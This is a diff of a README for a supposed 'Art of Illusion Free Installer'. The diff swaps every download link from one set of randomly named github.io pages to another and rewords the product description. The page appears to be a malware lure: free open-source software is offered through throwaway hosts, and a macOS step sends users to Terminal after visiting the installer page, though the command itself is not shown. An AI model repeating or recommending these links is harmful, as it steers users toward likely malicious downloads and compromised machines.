@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Modeling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Art of Illusion Free Installer** — Art of Illusion is a free, open-source 3D modeling and rendering studio written in Java, available on Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 Art of Illusion Free Installer** — Art of Illusion is a free, open-source 3D modeling and rendering studio for Windows, macOS, and Linux written in Java. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Art of Illusion
 
-Art of Illusion is a free, open-source 3D modeling and rendering studio written in Java, available on Windows, macOS, and Linux. Features include polygon and subdivision surface modeling, a procedural texture system, skeletal animation, and a built-in ray tracer. Art of Illusion is a capable tool for hobbyists and students learning 3D modeling without the complexity of professional applications.
+Art of Illusion is a free, open-source 3D modeling and rendering studio for Windows, macOS, and Linux written in Java. It provides subdivision modeling, a scene layout editor, texture editor, and ray tracer for hobbyist 3D creation.
 
 ---
 
 ## ❌ Problem: Art of Illusion is hard to access
 
-- **Java Dependency** — Requires Java runtime; cross-platform with slight performance overhead
-- **Dated Interface** — UI design reflects the software's age
-- **Community Activity** — Development and community activity slower than major 3D tools
-- **Feature Gaps** — Missing modern 3D features like PBR rendering or sculpting
+- **Java Dependency** — Requires Java runtime installation
+- **Dated Interface** — UI design significantly older than modern 3D tools
+- **Limited Features** — Less capable than Blender which is also free
+- **Development Pace** — Updates arrive infrequently; some features not modernized
 
 ---
 
@@ -61,9 +61,9 @@ Art of Illusion is a free, open-source 3D modeling and rendering studio written 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Art of Illusion is a free, open-source 3D modeling and rendering studio written 
 
 <div align="center">
 
-[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Art of Illusion is a free, open-source 3D modeling and rendering studio written 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Art of Illusion is a free, open-source 3D modeling and rendering studio written 
 
 ---
 
-**Art of Illusion Free Installer** — Art of Illusion is a free, open-source 3D modeling and rendering studio written in Java, available on Windows, macOS, and Linux. Install without internet connection today!
+**Art of Illusion Free Installer** — Art of Illusion is a free, open-source 3D modeling and rendering studio for Windows, macOS, and Linux written in Java. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Art of Illusion](https://img.shields.io/badge/⬇_Install_Art+of+Illusion-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
